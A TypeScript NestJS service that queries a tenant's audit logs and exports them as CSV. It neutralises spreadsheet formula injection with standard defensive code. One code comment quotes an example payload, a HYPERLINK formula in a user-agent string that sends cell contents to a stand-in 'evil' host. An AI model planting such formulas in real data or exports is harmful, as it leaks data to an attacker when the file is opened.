/**
 * AuditQueryService.
 *
 * Read-only service for the audit log query and export API. Tenant-scoped:
 * the `tenantId` always comes from `req.user.tenantId` (DB-sourced principal)
 * and is never overridable by a query parameter.
 *
 * CSV serialisation is done here so the controller stays thin.
 */
import { BadRequestException, Injectable } from '@nestjs/common';
import type { AuditLog } from '../database/schema/audit_log';
import {
  AuditRepository,
  EXPORT_ROW_CAP,
  type AuditQueryFilters,
  type AuditQueryResult,
} from './audit.repository';
import type { AuditQueryParams, AuditExportQueryParams } from './dto/audit-query.dto';
import { EXPORT_MAX_RANGE_DAYS } from './dto/audit-query.dto';

/** CSV column order. */
const CSV_HEADERS = [
  'created_at',
  'actor_type',
  'actor_id',
  'action',
  'resource_type',
  'resource_id',
  'ip_address',
  'user_agent',
  'changes',
] as const;

/**
 * Characters that, when they LEAD a spreadsheet cell, cause Excel / LibreOffice /
 * Google Sheets to interpret the cell as a FORMULA. `user_agent` is fully
 * attacker-controlled (any client sets its UA on a login, which is audited
 * verbatim) and `changes` JSON values can begin with `=` — so a UA like
 * `=HYPERLINK("http://evil/?"&A1,"x")` would EXECUTE when an owner opens the
 * exported CSV. We neutralise by prefixing a single quote, the standard
 * CSV-injection mitigation (OWASP). Includes the tab/CR cases some sheet apps
 * treat as formula leads.
 */
const FORMULA_LEAD_CHARS = new Set(['=', '+', '-', '@', '\t', '\r']);

/**
 * Escape a single CSV field value:
 *   - neutralise spreadsheet formula injection: if the value LEADS with a
 *     formula trigger char (= + - @ TAB CR), prefix a single quote `'`
 *   - wrap in double-quotes if it contains a comma, newline, or double-quote
 *   - double any embedded double-quotes
 *   - null/undefined → empty string
 *
 * Order matters: formula-neutralisation runs FIRST (on the raw string) so the
 * prepended `'` is itself inside the eventual quoting, and the quote/comma/newline
 * rule then sees the already-neutralised value.
 */
export function escapeCSVField(value: unknown): string {
  if (value === null || value === undefined) return '';
  let str = typeof value === 'object' ? JSON.stringify(value) : String(value);

  // Formula-injection neutralisation (applies to EVERY field).
  const first = str.charAt(0);
  if (first !== '' && FORMULA_LEAD_CHARS.has(first)) {
    str = `'${str}`;
  }

  // Must quote if contains comma, double-quote, CR, or LF.
  if (/[",\r\n]/.test(str)) {
    return `"${str.replace(/"/g, '""')}"`;
  }
  return str;
}

/** Serialize a single audit row to a CSV line (no trailing newline). */
function rowToCsvLine(row: AuditLog): string {
  return [
    escapeCSVField(row.createdAt?.toISOString()),
    escapeCSVField(row.actorType),
    escapeCSVField(row.actorId),
    escapeCSVField(row.action),
    escapeCSVField(row.resourceType),
    escapeCSVField(row.resourceId),
    escapeCSVField(row.ipAddress),
    escapeCSVField(row.userAgent),
    escapeCSVField(row.changes),
  ].join(',');
}

@Injectable()
export class AuditQueryService {
  constructor(private readonly repo: AuditRepository) {}

  async query(tenantId: string, params: AuditQueryParams): Promise<AuditQueryResult> {
    const filters: AuditQueryFilters = {
      tenantId,
      actorId: params.actorId,
      resourceType: params.resourceType,
      resourceId: params.resourceId,
      action: params.action,
      dateFrom: params.dateFrom,
      dateTo: params.dateTo,
      page: params.page ?? 1,
      pageSize: params.pageSize ?? 20,
    };
    return this.repo.query(filters);
  }

  async exportCsv(
    tenantId: string,
    params: AuditExportQueryParams,
  ): Promise<{ csv: string; rowCount: number }> {
    // The DTO guarantees both bounds are present and the window is ≤31 days
    // (it derives the missing bound). Defence-in-depth: re-assert the cap so a
    // mis-wired caller can never widen the window past the limit.
    if (params.dateFrom && params.dateTo) {
      const diffDays =
        (params.dateTo.getTime() - params.dateFrom.getTime()) / (1000 * 60 * 60 * 24);
      if (diffDays > EXPORT_MAX_RANGE_DAYS) {
        throw new BadRequestException(
          `Export date range must not exceed ${EXPORT_MAX_RANGE_DAYS} days`,
        );
      }
    }

    const { rows, capped } = await this.repo.queryAll({
      tenantId,
      actorId: params.actorId,
      resourceType: params.resourceType,
      resourceId: params.resourceId,
      action: params.action,
      dateFrom: params.dateFrom,
      dateTo: params.dateTo,
    });

    // Even within a bounded window, a dense result that hits the row cap must
    // NOT be served as if it were complete (#3) — a truncated audit artifact is
    // worse than none. Fail loudly and tell the operator to narrow the range.
    if (capped) {
      throw new BadRequestException(
        `Export matched more than ${EXPORT_ROW_CAP} rows — narrow the date range or add filters and retry.`,
      );
    }

    const headerLine = CSV_HEADERS.join(',');
    const lines = rows.map(rowToCsvLine);
    const csv = [headerLine, ...lines].join('\r\n');

    return { csv, rowCount: rows.length };
  }
}
